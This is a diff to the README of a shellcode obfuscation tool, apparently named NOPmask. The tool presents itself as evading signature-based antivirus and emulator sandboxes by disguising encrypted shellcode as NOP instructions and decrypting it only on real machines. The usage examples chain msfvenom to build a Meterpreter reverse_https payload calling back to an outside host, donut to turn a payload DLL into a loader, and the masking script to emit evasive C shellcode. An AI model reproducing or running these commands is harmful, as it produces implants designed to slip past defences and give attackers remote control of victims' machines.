@@ -10,8 +10,9 @@ Shellcode obfuscation utility to evade signature-based detection and emulator-dr
 
 ## Features
 
-- Shellcode encryption to make shellcode appear like benign NOP instructions.
-- Emulator evasion to only decrypt and execute shellcode if running on real machine.
+- Encrypts shellcode to appear like benign NOP instructions.
+- Only decrypts and executes shellcode if running on real machine.
+- Uses pure assembly with no dependencies, so it works on any operating system.
 
 ---
 
@@ -52,14 +53,14 @@ Example of using with msfvenom:
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=1.2.3.4 LPORT=443 -f raw -o raw_shellcode.bin
 python NOPmask.py -a amd64 -i raw_shellcode.bin -o masked_shellcode.bin -f binary
-msfvenom -p generic/custom PAYLOADFILE=masked_shellcode.bin -f C -v shellcode -o masked_shellcode.c
+msfvenom -p generic/custom PAYLOADFILE=masked_shellcode.bin -f C -v shellcode
 ```
 
 Example of using with donut:
 ```bash
-donut.exe -i reverse_https.dll -a 2
+donut.exe -a 2 -i payload.dll -o loader.bin
 python NOPmask.py -a amd64 -i loader.bin -o masked_loader.bin -f binary
-msfvenom -p generic/custom PAYLOADFILE=masked_loader.bin -f C -v shellcode -o masked_shellcode.c
+msfvenom -p generic/custom PAYLOADFILE=masked_loader.bin -f C -v shellcode
 ```
 
 ### Warnings
